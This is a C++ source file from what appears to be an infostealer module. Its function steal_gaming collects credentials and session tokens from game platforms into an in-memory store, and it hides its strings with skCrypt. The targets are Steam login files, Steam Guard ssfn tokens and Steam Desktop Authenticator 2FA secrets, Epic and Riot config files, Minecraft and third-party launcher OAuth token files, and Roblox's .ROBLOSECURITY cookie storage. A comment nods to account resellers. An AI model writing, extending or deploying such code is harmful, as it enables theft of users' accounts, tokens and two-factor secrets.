#include <misc_stealing/gaming.hpp>
#include <filesystem>
#include <string>
#include <windows.h>
#include <sysinfo.hpp>
#include <exfiltration_utils/mem_store.hpp>
#include <crypto_utils/skCrypter.hpp>

namespace fs = std::filesystem;

namespace misc_exfiltration {

void steal_gaming() {
    std::string home = features::get_home();
    std::string lapp = home + skCrypt("\\AppData\\Local\\");
    std::string rapp = home + skCrypt("\\AppData\\Roaming\\");

    //shoutout to NFA sellers keeping semirage alive.

    //steam
    {
        HKEY hk;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, skCrypt("Software\\Valve\\Steam"), 0, KEY_READ, &hk) == ERROR_SUCCESS) {
            char steam_path[MAX_PATH]{};
            DWORD sz = sizeof(steam_path);
            if (RegQueryValueExA(hk, skCrypt("SteamPath"), nullptr, nullptr, (LPBYTE)steam_path, &sz) == ERROR_SUCCESS) {
                fs::path cfg = fs::path(steam_path) / skCrypt("config");

                fs::path lu = cfg / skCrypt("loginusers.vdf");
                if (fs::exists(lu))
                    mem_store::import_file(skCrypt("gaming/steam/loginusers.vdf"), lu);

                fs::path cv = cfg / skCrypt("config.vdf");
                if (fs::exists(cv))
                    mem_store::import_file(skCrypt("gaming/steam/config.vdf"), cv);

                //ssfn = per machine steam guard token
                try {
                    for (const auto& e : fs::directory_iterator(steam_path)) {
                        if (e.path().filename().string().rfind(skCrypt("ssfn"), 0) == 0)
                            mem_store::import_file(
                                skCrypt("gaming/steam/") + e.path().filename().string(),
                                e.path());
                    }
                } catch (const std::exception&) {}

                //sda if kept inside steam dir
                fs::path sda_in_steam = fs::path(steam_path) / skCrypt("SteamDesktopAuthenticator") / skCrypt("maFiles");
                if (fs::exists(sda_in_steam)) {
                    try {
                        for (const auto& e : fs::directory_iterator(sda_in_steam)) {
                            if (!e.is_regular_file()) continue;
                            auto ext = e.path().extension().string();
                            if (ext == skCrypt(".maFile") || e.path().filename() == skCrypt("settings.json"))
                                mem_store::import_file(skCrypt("gaming/steam/sda/") + e.path().filename().string(), e.path());
                        }
                    } catch (const std::exception&) {}
                }
            }
            RegCloseKey(hk);
        }
    }

    //sda mafiles contain shared_secret and identity_secret, enough to bypass steam 2fa
    {
        fs::path locations[] = {
            fs::path(home)  / skCrypt("Desktop")   / skCrypt("SteamDesktopAuthenticator") / skCrypt("maFiles"),
            fs::path(home)  / skCrypt("Documents")  / skCrypt("SteamDesktopAuthenticator") / skCrypt("maFiles"),
            fs::path(rapp)  / skCrypt("SteamDesktopAuthenticator") / skCrypt("maFiles"),
        };
        for (const auto& loc : locations) {
            if (!fs::exists(loc)) continue;
            try {
                for (const auto& e : fs::directory_iterator(loc)) {
                    if (!e.is_regular_file()) continue;
                    auto ext = e.path().extension().string();
                    if (ext == skCrypt(".maFile") || e.path().filename() == skCrypt("settings.json"))
                        mem_store::import_file(skCrypt("gaming/steam/sda/") + e.path().filename().string(), e.path());
                }
            } catch (const std::exception&) {}
        }
    }

    //epic
    {
        fs::path epic_src = fs::path(lapp) / skCrypt("EpicGamesLauncher") / skCrypt("Saved") / skCrypt("Config") / skCrypt("Windows");
        mem_store::import_tree(skCrypt("gaming/epic"), epic_src);
    }

    //riot
    {
        fs::path riot = fs::path(lapp) / skCrypt("Riot Games") / skCrypt("Riot Client") / skCrypt("Data") / skCrypt("RiotGamesPrivateSettings.yaml");
        if (fs::exists(riot))
            mem_store::import_file(skCrypt("gaming/riot/RiotGamesPrivateSettings.yaml"), riot);
    }

    //minecraft official launcher, accounts.json has microsoft oauth access and refresh tokens
    {
        fs::path vanilla = fs::path(rapp) / skCrypt(".minecraft") / skCrypt("launcher_accounts.json");
        if (fs::exists(vanilla))
            mem_store::import_file(skCrypt("gaming/minecraft/vanilla_accounts.json"), vanilla);

        fs::path profiles = fs::path(rapp) / skCrypt(".minecraft") / skCrypt("launcher_profiles.json");
        if (fs::exists(profiles))
            mem_store::import_file(skCrypt("gaming/minecraft/launcher_profiles.json"), profiles);
    }

    //third party launchers, all use the same ms oauth accounts.json format
    {
        fs::path prism = fs::path(rapp) / skCrypt("PrismLauncher") / skCrypt("accounts.json");
        if (fs::exists(prism))
            mem_store::import_file(skCrypt("gaming/minecraft/prism_accounts.json"), prism);

        fs::path multimc = fs::path(rapp) / skCrypt("MultiMC") / skCrypt("accounts.json");
        if (fs::exists(multimc))
            mem_store::import_file(skCrypt("gaming/minecraft/multimc_accounts.json"), multimc);

        fs::path polymc = fs::path(rapp) / skCrypt("PolyMC") / skCrypt("accounts.json");
        if (fs::exists(polymc))
            mem_store::import_file(skCrypt("gaming/minecraft/polymc_accounts.json"), polymc);

        fs::path atl = fs::path(rapp) / skCrypt("ATLauncher") / skCrypt("accounts.json");
        if (fs::exists(atl))
            mem_store::import_file(skCrypt("gaming/minecraft/atl_accounts.json"), atl);

        fs::path gdl = fs::path(rapp) / skCrypt("gdlauncher_next") / skCrypt("data.json");
        if (fs::exists(gdl))
            mem_store::import_file(skCrypt("gaming/minecraft/gdlauncher_data.json"), gdl);
    }

    //roblox desktop app, LocalStorage holds the .ROBLOSECURITY cookie db
    {
        fs::path rblx = fs::path(lapp) / skCrypt("Roblox") / skCrypt("LocalStorage");
        mem_store::import_tree(skCrypt("gaming/roblox"), rblx, 512 * 1024);
    }
}

}
